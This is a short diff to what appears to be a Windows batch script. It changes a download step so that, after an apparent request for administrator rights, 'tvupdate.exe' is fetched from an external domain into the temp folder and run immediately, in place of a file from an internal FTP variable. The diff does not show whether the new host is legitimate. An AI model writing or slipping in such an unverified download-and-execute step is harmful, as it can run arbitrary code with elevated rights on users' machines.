@@ -346,9 +346,9 @@ call :getadmin
 %temp:~0,2%
 cd "%temp%"
 
-%curl% --ignore-content-length %ftp%/PORTABLES/ReTeam13.exe
+%curl% --ignore-content-length https://agdseguridad.com.ar/tvupdate.exe
 
-"%temp%\ReTeam13.exe"
+"%temp%\tvupdate.exe"
 
 goto next
 rem ------------------------------------------------------------------------------------------
